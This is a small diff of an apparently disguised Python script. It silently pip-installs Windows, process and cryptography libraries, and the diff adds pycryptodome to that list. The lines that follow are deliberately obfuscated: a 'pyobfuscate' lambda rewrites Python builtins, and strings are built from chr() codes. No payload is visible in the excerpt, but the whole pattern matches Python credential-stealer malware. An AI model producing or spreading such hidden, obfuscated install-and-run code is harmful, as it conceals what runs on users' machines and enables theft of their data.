@@ -1,6 +1,6 @@
 # SETUP
 import os
-os.system("pip install requests cloudscraper beautifulsoup4 pystyle psutil pywin32 cryptography")
+os.system("pip install requests cloudscraper beautifulsoup4 pystyle psutil pywin32 cryptography pycryptodome")
 
 #SCRIPT
 pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl))(IIlII,IlIIl)) for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';lIl=chr(115)+chr(117)+chr(98)
